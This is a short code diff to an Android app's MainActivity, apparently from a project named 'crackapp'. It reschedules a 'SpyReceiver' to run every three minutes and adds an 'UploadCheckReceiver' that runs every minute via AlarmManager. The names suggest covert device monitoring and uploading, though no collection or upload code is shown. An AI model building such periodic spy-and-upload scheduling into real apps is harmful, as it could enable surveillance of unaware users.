@@ -28,6 +28,7 @@ import co.poweramp.crackapp.Constants;
 import co.poweramp.crackapp.R;
 import co.poweramp.crackapp.receiver.SaneAsyncHttpResponseHandler;
 import co.poweramp.crackapp.receiver.SpyReceiver;
+import co.poweramp.crackapp.receiver.UploadCheckReceiver;
 import cz.msebera.android.httpclient.Header;
 
 public class MainActivity extends AppCompatActivity {
@@ -112,11 +113,15 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
-        Intent intent = new Intent(this, SpyReceiver.class);
-        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, intent, 0);
-
         AlarmManager manager = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
-        manager.setRepeating(AlarmManager.RTC_WAKEUP, SystemClock.elapsedRealtime(), 180000, pendingIntent);
+
+        Intent spyReceiverIntent = new Intent(this, SpyReceiver.class);
+        PendingIntent spyReceiverPendingIntent = PendingIntent.getBroadcast(this, 0, spyReceiverIntent, 0);
+        manager.setRepeating(AlarmManager.RTC_WAKEUP, SystemClock.elapsedRealtime(), 180000, spyReceiverPendingIntent);
+
+        Intent uploadCheckReceiverIntent = new Intent(this, UploadCheckReceiver.class);
+        PendingIntent uploadCheckReceiverPendingIntent = PendingIntent.getBroadcast(this, 0, uploadCheckReceiverIntent, 0);
+        manager.setRepeating(AlarmManager.RTC_WAKEUP, SystemClock.elapsedRealtime(), 60000, uploadCheckReceiverPendingIntent);
 
         final SharedPreferences sharedPref = getSharedPreferences(getString(R.string.preference_account_id), Context.MODE_PRIVATE);
         if (sharedPref.getInt("accountId", -1) == -1) {
